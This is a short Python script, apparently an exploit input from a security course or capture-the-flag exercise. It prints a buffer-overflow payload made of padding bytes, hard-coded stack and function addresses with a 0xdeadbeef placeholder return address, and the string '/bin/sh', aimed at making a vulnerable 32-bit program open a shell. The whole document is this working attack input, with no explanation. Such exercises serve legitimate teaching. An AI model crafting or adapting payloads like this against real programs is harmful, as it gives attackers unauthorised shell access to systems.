from shellcode import shellcode
import sys
sys.stdout.buffer.write(0xff.to_bytes(1,"little")*18+0xfff6cee8.to_bytes(4, "little")+0x08051520.to_bytes(4,"little")+0xdeadbeef.to_bytes(4, "little")+0xfff6cef8.to_bytes(4,"little")+b"/bin/sh")
